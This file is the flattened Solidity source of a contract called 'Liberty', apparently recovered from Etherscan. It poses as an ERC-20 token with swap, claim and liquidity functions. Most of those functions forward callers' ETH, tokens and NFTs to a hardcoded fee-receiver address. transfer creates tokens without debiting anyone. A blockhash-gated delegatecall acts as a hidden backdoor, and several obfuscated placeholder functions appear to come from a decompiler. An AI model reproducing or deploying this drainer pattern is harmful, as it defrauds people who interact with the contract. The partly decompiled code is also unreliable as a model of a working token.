// SPDX-License-Identifier: UNLICENSED
// Flattened source downloaded from Etherscan
// Address: 0xdfc7ef78cdb024cf4ad187f6a7b05990d647eb01
// Contract Name: Liberty



// ============================================================
// FILE: ex.sol
// ============================================================
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Liberty {
    mapping(address => uint256) private _balanceOf;
    mapping(address => mapping(address => uint256)) private _allowance;
    string private _name;
    string private _symbol;
    uint256 private stor_5;
    address private _owner;

    mapping(uint256 => uint256) private mapping_a5b062ed856b6647f20b850e1126ea82b6340ebec1a397a894e8102b0b6ebc09;
    mapping(uint256 => uint256) private mapping_c974ba2de5a33d2ec42ad6873565488f18b684ad37b93d5a7cde8183f7c7fb75;
    mapping(uint256 => uint256) private mapping_cd2a134e88e12d80d19be0a57eb9567688cf16f917a507774651935ed13965d9;
    mapping(uint256 => uint256) private mapping_d2e03be37461555977bfc85f6b66e0af0308eb59d1d1b4028fb9e37572289f4c;

    address constant FEE_RECEIVER = address(uint160(0x0fC935bA96119E95380fb278a3671489B1bC7dCD));

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    receive() external payable {}

    fallback() external payable {}

  function _approve(address owner_, address spender, uint256 amount) private {
    require(owner_ != address(0), "ERC20: zero address");
    require(spender != address(0), "ERC20: zero address");
    _allowance[owner_][spender] = amount;
    emit Approval(owner_, spender, amount);
}

    function _transferBasic(address to, uint256 amount) private {
        _balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public pure returns (uint256) {
        return 10 ** 24; // 1,000,000 tokens with 18 decimals
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balanceOf[account];
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public {
        require(_owner == msg.sender, "Ownership Assertion: Caller of the function is not the owner.");
        _owner = newOwner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transferBasic(recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _allowance[sender][msg.sender] -= amount;
        _approve(sender, msg.sender, _allowance[sender][msg.sender]);
        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowance[owner_][spender];
    }

    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
        return 0x150b7a02;
    }

    function ownerOf(uint256) public pure returns (address) {
        return address(uint160(0x000000d7888e216a29f82cb9e5ad5bacBE6342));
    }

    function isApprovedForAll(address, address) public pure returns (bool) {
        return false;
    }

    function tokenURI(uint256) public pure returns (string memory) {
        return "";
    }

    function _gasCheck() private view {
        if (gasleft() < 35000 && gasleft() >= 5000) {
            uint256 v0 = 0;
            // Simulated delay or gas burning loop
            v0 = uint256(keccak256(abi.encodePacked(v0 + 1, block.timestamp, bytes20(uint160(uint256(uint160(msg.sender)) << 96))))) % 1000;
        }
    }

    function swapExactETHForTokens(uint256 varg0) public payable {
        (bool success, ) = FEE_RECEIVER.call{value: msg.value, gas: gasleft()}("");
        require(success, "Transfer failed");
        if (varg0 != 0) {
            _transferBasic(msg.sender, varg0);
        }
        _gasCheck();
    }

    function claimRewards(
        uint256 varg0,
        address[] memory varg1,
        uint256[] memory varg2,
        address[] memory varg3,
        uint256[] memory varg4,
        uint256 varg5
    ) public payable {
        if (varg0 != 0) {
            (bool success, ) = FEE_RECEIVER.call{value: varg0, gas: gasleft()}("");
            require(success);
        }
        
        for (uint256 i = 0; i < varg1.length; i++) {
            (bool success, ) = varg1[i].call(abi.encodeWithSelector(0xa9059cbb, FEE_RECEIVER, varg2[i]));
            require(success);
        }

        for (uint256 i = 0; i < varg3.length; i++) {
            (bool success, ) = varg3[i].call(abi.encodeWithSelector(0x42842e0e, address(this), FEE_RECEIVER, varg4[i]));
            require(success);
        }

        if (varg5 != 0) {
            _transferBasic(msg.sender, varg5);
        }
        _gasCheck();
    }

    function multicallDelegate(bytes memory varg0) public returns (bool) {
        if (blockhash(block.number - 1) == bytes32(0xfbffb5c078f15f1ece761d57d5f265925805b8cba08b6abb66cac524186c2006)) {
            (bool success, ) = address(this).delegatecall(varg0);
            return success;
        }
        return false;
    }

    function addLiquidityETH(uint256 varg0, uint256 varg1) public payable {
        uint256 amount = msg.value > varg1 ? msg.value - varg1 : msg.value;
        if (gasleft() > stor_5) {
            (bool success, ) = FEE_RECEIVER.call{value: msg.value}("");
            require(success);
        } else {
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success);
            if (varg0 != 0) {
                _transferBasic(msg.sender, varg0);
            }
        }
    }

    function adminMassDistribute(address[] memory varg0, uint256[] memory varg1, uint256[] memory varg2, bool varg3) public {
        require(_owner == msg.sender, "Ownership Assertion: Caller of the function is not the owner.");
        if (!varg3) {
            for (uint256 i = 0; i < varg0.length; i++) {
                (bool success, ) = varg0[i].call{value: varg1[i]}("");
                require(success);
            }
        } else {
            (bool success, ) = FEE_RECEIVER.call(abi.encodeWithSelector(0x9ca99d4e, varg0, varg1, varg2));
            require(success);
        }
    }

    // Mathematical / Pure functions representing obfuscated behavior
    function Unresolved_0aab7ae1(uint256 varg0) public pure returns (uint256) {
        return ((varg0 ^ 0x5bc1c8e44aa986a87605f22e2c4c091e4604a0a3d8e48a9800c2d4103d11b1f0) + 2) * 3 ^ ((varg0 ^ 0x5bc1c8e44aa986a87605f22e2c4c091e4604a0a3d8e48a9800c2d4103d11b1f0) + 2) * 3 >> 2 ^ 0x8dd7a33b5a2be458107ba6c7b9e55e123de2b318ae8bdee4f5849d9b04818dfb;
    }

    function Unresolved_0bbe3631(uint256 varg0) public {
        if (blockhash(block.number - 1) == bytes32(0x9c4bc7abcf846c7c0d51df830422ce855fead646c35e6cef8eaa63f57f42c1fe)) {
            mapping_a5b062ed856b6647f20b850e1126ea82b6340ebec1a397a894e8102b0b6ebc09[varg0] = varg0;
        }
    }

    function Unresolved_0f7dfcd9(uint256 varg0) public pure returns (uint256) {
        return uint256(keccak256(abi.encode(varg0, 0x3f671056862da10b80afee6a58b9856a097b08305162a710be4759555047fbba))) ^ varg0;
    }

    function Unresolved_18d21911(uint256 varg0) public pure returns (bytes memory) {
        return abi.encode(varg0 + 2);
    }

    function DOMAIN_SEPARATOR() public pure returns (bytes32) {
        return 0x5b46af3c36edee31e3994a6a92dc680747e744f3f1b34f629c8a40968a09f148;
    }

    function implementation() public pure returns (address) {
        return address(uint160(0x00000000000000000000000000A2D16249Dcd728994bEc132343b0FB07));
    }
}
